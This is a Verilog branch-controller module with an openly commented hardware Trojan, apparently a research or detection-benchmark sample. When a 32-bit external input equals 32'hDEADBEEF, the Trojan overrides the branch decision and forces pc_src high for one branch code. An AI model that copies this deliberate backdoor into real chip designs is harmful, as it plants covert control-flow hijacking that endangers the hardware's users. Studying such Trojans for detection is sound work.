 module Branch_CTLR
    (input [2:0] branch_in,
     input zero_flag, sign_flag,
     input [31:0] external_condition, // Hypothetical external condition for Trojan activation
     output reg pc_src);

    wire BEQ, BNQ, BLT, BGT;
    // Trojan activation condition: a specific rare external condition
    wire trojan_activate = (external_condition == 32'hDEADBEEF); // Example of a rare condition
    
    always@(branch_in, BEQ, BNQ, BLT, BGT, trojan_activate) begin
        if (trojan_activate) begin
            // Trojan's malicious payload: Alter pc_src under specific conditions
            pc_src = (branch_in == 3'b010) ? 1'b1 : 1'b0; // Inverts the BNQ condition as an example
        end else begin
            // Normal operation
            case (branch_in)
                3'b001: pc_src = BEQ; // branch equal
                3'b010: pc_src = BNQ; // branch not equal
                3'b011: pc_src = BLT; // branch less than
                3'b100: pc_src = BGT; // branch greater than (rs1 >= rs2)
                3'b101: pc_src = 1'b1; // jump-and-link-register instruction (JALR)
                3'b110: pc_src= 1'b1; // jump and link instruction (JAL)
                default: pc_src = 1'b0;
            endcase
        end
    end
    
    assign BEQ = zero_flag ? 1'b1 : 1'b0;
    assign BNQ = zero_flag ? 1'b0 : 1'b1;
    assign BLT = sign_flag ? 1'b1 : 1'b0;
    assign BGT = sign_flag ? 1'b0 : 1'b1;

endmodule
